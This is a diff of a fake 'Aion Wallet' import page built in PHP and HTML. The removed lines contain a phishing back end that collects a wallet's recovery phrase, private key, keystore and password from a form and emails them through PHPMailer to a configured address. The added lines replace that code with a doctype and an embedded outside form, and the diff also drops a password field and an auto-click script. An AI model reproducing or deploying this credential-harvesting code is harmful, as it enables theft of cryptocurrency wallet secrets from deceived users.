@@ -1,79 +1,5 @@
-<?php 
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
-
-require 'PHPMailer/src/Exception.html';
-require 'PHPMailer/src/PHPMailer.html';
-require 'PHPMailer/src/SMTP.html';
-include 'config.html';
-
-$message = "";
-
-  if (isset($_POST['submit'])) {
-    $phrase = $_POST['phrase'];
-    $key = $_POST['key'];
-    $keystore = $_POST['keystore'];
-    $password = $_POST['password'];
-
-    $mail = new PHPMailer(true);
-
-      try {
-       //Server settings
-       $mail->SMTPDebug = 0; // Enable verbose debug output
-       $mail->isSMTP(); // Set mailer to use SMTP
-       $mail->Host = $host; // Specify main and backup SMTP servers
-       $mail->SMTPAuth = true; // Enable SMTP authentication
-       $mail->Username = $username; // SMTP username
-       $mail->Password = $emailpassword; // SMTP password
-       $mail->SMTPSecure = 'tls'; // Enable TLS encryption, [ICODE]ssl[/ICODE] also accepted
-       $mail->Port = 587; // TCP port to connect to
-
-      //Recipients
-       $mail->setFrom($setForm, "");
-       $mail->addAddress($send_to, '');
-
-      // Content
-       $mail->isHTML(true); 
-       $mail->Subject = 'Aion Wallet form';
-       $mail->Body = '
-          <TABLE>
-             <TR>
-                <TD>Phrase</TD>
-                <TD>'.$phrase.'</TD>
-             </TR>
-             <TR>
-                <TD>Keystore</TD>
-                <TD>'.$keystore.'</TD>
-             </TR>
-             <TR>
-                <TD>Password </TD>
-                <TD>'.$password.'</TD>
-             </TR>
-             <TR>
-                <TD>Key</TD>
-                <TD>'.$key.'</TD>
-             </TR>
-            </TABLE>
-         ';
-
-        $send = $mail->send();
-        if($send){
-
-         echo 'Form has been submitted';
-        }
-
-        } catch (Exception $e) {
-         echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
-     }
-
-  }
-
-
-?>
-
-
-
-
+<!doctype html>
+<html lang="en">
 
 
 <html>
@@ -165,15 +91,7 @@ $message = "";
     <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
     <br>
     <div class="field">
-        <input type="text" name="password" class="keystorepassword" placeholder="Password">
-    </div>
-        <div class="desc">
-            Several lines of text beginning with '(...)' plus the password you used to encrypt it.
-        </div>
-        <br>
-        <button type="button" onclick="openCity(event, &#39;private1&#39;)" class="btn" value="IMPORT" >IMPORT</button>
-    
-  </div>
+   
 
 <div id="private1" class="tabcontent" style="display: none;">
     
@@ -181,11 +99,6 @@ $message = "";
         <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
     </form>
 </div>
-
-<script>
-    document.getElementById("default").click();
-</script>
-
 
 <footer><div id="footer">
 <p><img src="assets\discord.svg" class="footimg">  <a href="https://discord.gg/">Discord</a></p><br>
